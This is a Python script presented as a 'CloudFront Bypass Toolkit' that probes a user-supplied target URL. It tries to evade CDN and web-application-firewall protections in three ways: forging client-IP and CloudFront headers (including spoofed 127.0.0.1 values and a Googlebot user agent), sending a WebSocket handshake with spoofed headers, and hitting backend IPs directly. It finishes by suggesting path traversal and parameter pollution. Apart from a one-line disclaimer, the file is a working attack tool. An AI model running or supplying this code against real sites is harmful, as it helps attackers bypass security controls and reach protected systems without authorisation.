import sys
import socket
import ssl
import random
import string
import base64
import hashlib
import struct
import time
from urllib.parse import urlparse

class CloudFrontBypass:
    def __init__(self, target_url):
        self.target_url = target_url
        parsed = urlparse(target_url)
        self.host = parsed.hostname
        self.port = parsed.port or 443
        self.path = parsed.path or '/'
        self.scheme = parsed.scheme
        
    def generate_random_headers(self):
        headers = {}
        
        cloudfront_headers = {
            'X-Forwarded-For': self.generate_random_ip(),
            'X-Forwarded-Host': self.host,
            'X-Real-IP': self.generate_random_ip(),
            'X-Forwarded-Proto': 'https',
            'X-Forwarded-Port': '443',
            'X-Forwarded-Scheme': 'https',
            'X-CloudFront-Viewer-Country': random.choice(['US', 'GB', 'DE', 'FR', 'JP']),
            'X-CloudFront-Is-Desktop-Viewer': 'true',
            'X-CloudFront-Is-Mobile-Viewer': 'false',
            'X-CloudFront-Is-Tablet-Viewer': 'false',
            'X-CloudFront-Is-SmartTV-Viewer': 'false',
            'CloudFront-Forwarded-Proto': 'https',
            'CloudFront-Is-Desktop-Viewer': 'true',
            'CloudFront-Is-Mobile-Viewer': 'false',
            'CloudFront-Viewer-Country': random.choice(['US', 'GB']),
        }
        
        headers.update(cloudfront_headers)
        
        waf_bypass_headers = {
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'True-Client-IP': '127.0.0.1',
            'CF-Connecting-IP': '127.0.0.1',
            'CF-RAY': self.generate_cf_ray(),
            'CF-IPCountry': random.choice(['US', 'GB']),
            'CF-Visitor': '{"scheme":"https"}',
            'X-Request-ID': self.generate_request_id(),
            'X-Correlation-ID': self.generate_request_id(),
        }
        
        headers.update(waf_bypass_headers)
        
        return headers
    
    def generate_random_ip(self):
        return f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
    
    def generate_cf_ray(self):
        chars = string.ascii_lowercase + string.digits
        ray_id = ''.join(random.choice(chars) for _ in range(8))
        dc = random.choice(['fra', 'ams', 'lhr', 'iad', 'sfo'])
        return f"{ray_id}-{dc}"
    
    def generate_request_id(self):
        return hashlib.md5(str(time.time()).encode()).hexdigest()
    
    def test_standard_request(self):
        print(f"[*] Testing standard request to: {self.target_url}")
        
        import requests
        
        try:
            response = requests.get(
                self.target_url,
                headers={'User-Agent': 'Mozilla/5.0'},
                timeout=10,
                verify=False,
                allow_redirects=False
            )
            
            print(f"[+] Status Code: {response.status_code}")
            print(f"[+] Server: {response.headers.get('Server', 'Unknown')}")
            print(f"[+] X-Cache: {response.headers.get('X-Cache', 'Not found')}")
            print(f"[+] Via: {response.headers.get('Via', 'Not found')}")
            
            if 'cloudfront' in response.headers.get('Via', '').lower():
                print("[!] CloudFront Detected (Via header)")
                return True
            elif 'cloudfront' in response.headers.get('Server', '').lower():
                print("[!] CloudFront Detected (Server header)")
                return True
            elif 'x-amz-cf-' in str(response.headers).lower():
                print("[!] CloudFront Detected (Other headers)")
                return True
                
        except Exception as e:
            print(f"[-] Error: {e}")
            
        return False
    
    def bypass_with_forged_headers(self):
        print(f"\n[*] Attempting CloudFront bypass with forged headers")
        
        headers = self.generate_random_headers()
        
        headers['User-Agent'] = random.choice([
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'
        ])
        
        headers['Cache-Control'] = 'no-cache, no-store, must-revalidate'
        headers['Pragma'] = 'no-cache'
        headers['Expires'] = '0'
        
        try:
            import requests
            response = requests.get(
                self.target_url,
                headers=headers,
                timeout=15,
                verify=False,
                allow_redirects=False
            )
            
            print(f"[+] Status with forged headers: {response.status_code}")
            print(f"[+] X-Cache: {response.headers.get('X-Cache', 'N/A')}")
            
            if response.status_code == 200:
                content_length = len(response.content)
                print(f"[+] Content length: {content_length} bytes")
                
                if 'miss from cloudfront' in response.headers.get('X-Cache', '').lower():
                    print("[!] Possible bypass - CloudFront miss")
                elif 'error from cloudfront' in response.headers.get('X-Cache', '').lower():
                    print("[!] CloudFront error - bypass may be possible")
                elif content_length > 0 and 'cloudfront' not in response.text[:500].lower():
                    print("[!] Different content - backend reached?")
                    
                return response
                
        except Exception as e:
            print(f"[-] Error with forged headers: {e}")
            
        return None
    
    def test_websocket_bypass(self):
        print(f"\n[*] Testing CloudFront WebSocket bypass")
        
        ws_url = self.target_url.replace('https://', 'wss://').replace('http://', 'ws://')
        ws_path = self.path
        
        print(f"[*] Attempting connection: wss://{self.host}{ws_path}")
        
        try:
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            
            ssl_sock = context.wrap_socket(sock, server_hostname=self.host)
            ssl_sock.connect((self.host, self.port))
            
            key = base64.b64encode(hashlib.sha1(str(time.time()).encode()).digest()[:16]).decode()
            
            handshake_lines = [
                f"GET {ws_path} HTTP/1.1",
                f"Host: {self.host}",
                "Connection: Upgrade",
                "Upgrade: websocket",
                f"Sec-WebSocket-Key: {key}",
                "Sec-WebSocket-Version: 13",
                f"X-Forwarded-Host: {self.host}",
                f"X-Real-IP: 127.0.0.1",
                f"X-Forwarded-For: 127.0.0.1",
                f"X-Forwarded-Proto: https",
                f"CF-Connecting-IP: 127.0.0.1",
                f"True-Client-IP: 127.0.0.1",
                "User-Agent: Mozilla/5.0"
            ]
            
            handshake = "\r\n".join(handshake_lines) + "\r\n\r\n"
            ssl_sock.send(handshake.encode())
            
            response = ssl_sock.recv(4096)
            response_str = response.decode('latin-1', errors='ignore')
            
            print(f"[+] WebSocket Response: {response_str[:200]}")
            
            if "101 Switching Protocols" in response_str:
                print("[!] WebSocket Connection Succeeded")
                
                test_message = b'{"test": "cloudfront_bypass"}'
                ws_frame = b'\x81' + bytes([len(test_message)]) + test_message
                ssl_sock.send(ws_frame)
                
                ssl_sock.settimeout(2)
                try:
                    data = ssl_sock.recv(1024)
                    if data:
                        print(f"[+] Received: {data[:100]}")
                except socket.timeout:
                    print("[-] No response to test message")
                
                ssl_sock.close()
                return True
            else:
                print(f"[-] WebSocket connection failed")
                if "403" in response_str:
                    print("[-] CloudFront blocked the WebSocket")
                ssl_sock.close()
                return False
                
        except Exception as e:
            print(f"[-] WebSocket error: {e}")
            return False
    
    def test_direct_ip_access(self):
        print(f"\n[*] Attempting to discover backend IPs behind CloudFront")
        
        import socket
        try:
            ips = socket.gethostbyname_ex(self.host)[2]
            print(f"[+] Found IPs: {ips}")
            
            for ip in ips[:3]:
                print(f"[*] Testing direct IP: {ip}")
                
                try:
                    test_url = f"https://{ip}"
                    import requests
                    
                    headers = {
                        'Host': self.host,
                        'X-Forwarded-Host': self.host,
                        'User-Agent': 'CloudFront-Test/1.0'
                    }
                    
                    response = requests.get(
                        test_url,
                        headers=headers,
                        timeout=5,
                        verify=False,
                        allow_redirects=False
                    )
                    
                    print(f"  [+] IP {ip}: Status {response.status_code}")
                    print(f"  [+] Server: {response.headers.get('Server', 'N/A')}")
                    
                    if response.status_code == 200:
                        print(f"  [!] This may be the backend!")
                        return ip
                        
                except Exception as e:
                    print(f"  [-] IP {ip} failed: {e}")
                    
        except Exception as e:
            print(f"[-] DNS lookup error: {e}")
            
        return None
    
    def run_comprehensive_test(self):
        print("="*80)
        print("CloudFront Bypass Comprehensive Test")
        print("="*80)
        
        results = {
            'cloudfront_detected': False,
            'header_bypass_possible': False,
            'websocket_bypass_possible': False,
            'direct_ip_found': None
        }
        
        print("\n[1] CloudFront Detection")
        results['cloudfront_detected'] = self.test_standard_request()
        
        if results['cloudfront_detected']:
            print("\n[2] Header Forgery Bypass Test")
            forged_response = self.bypass_with_forged_headers()
            if forged_response and forged_response.status_code == 200:
                results['header_bypass_possible'] = True
            
            print("\n[3] WebSocket Bypass Test")
            results['websocket_bypass_possible'] = self.test_websocket_bypass()
            
            print("\n[4] Direct IP Access Test")
            results['direct_ip_found'] = self.test_direct_ip_access()
        
        print("\n" + "="*80)
        print("TEST RESULTS SUMMARY")
        print("="*80)
        
        for test, result in results.items():
            status = "✓" if result else "✗"
            if result and test == 'direct_ip_found':
                print(f"{status} {test}: {result}")
            else:
                print(f"{status} {test}: {'Yes' if result else 'No'}")
        
        print("\n[*] Test completed")
        return results

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 cloudfront_bypass.py <target_url>")
        print("Example: python3 cloudfront_bypass.py https://example.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    print("[!] CloudFront Bypass Toolkit - Educational Purposes Only!")
    print("[!] Use only on systems you have permission to test!")
    print(f"[*] Target: {target_url}")
    
    bypass = CloudFrontBypass(target_url)
    results = bypass.run_comprehensive_test()
    
    print("\n" + "="*80)
    print("RECOMMENDATIONS")
    print("="*80)
    
    if results['cloudfront_detected']:
        print("CloudFront detected. Bypass techniques attempted:")
        
        if results['header_bypass_possible']:
            print("- Header forgery may be possible")
            print("  Try different X-Forwarded-* headers combinations")
        
        if results['websocket_bypass_possible']:
            print("- WebSocket bypass may be possible")
            print("  Test WebSocket endpoints with forged headers")
        
        if results['direct_ip_found']:
            print(f"- Direct IP access possible: {results['direct_ip_found']}")
            print(f"  Try accessing https://{results['direct_ip_found']} with Host: {bypass.host}")
        
        print("\nNext steps:")
        print("1. Test different HTTP methods (POST, PUT, etc.)")
        print("2. Try path traversal: /../, /./, etc.")
        print("3. Test parameter pollution")
        print("4. Check for WAF bypass techniques")
    else:
        print("CloudFront not detected or target not using CloudFront")
        print("Standard security testing techniques may apply")

if __name__ == "__main__":
    main()
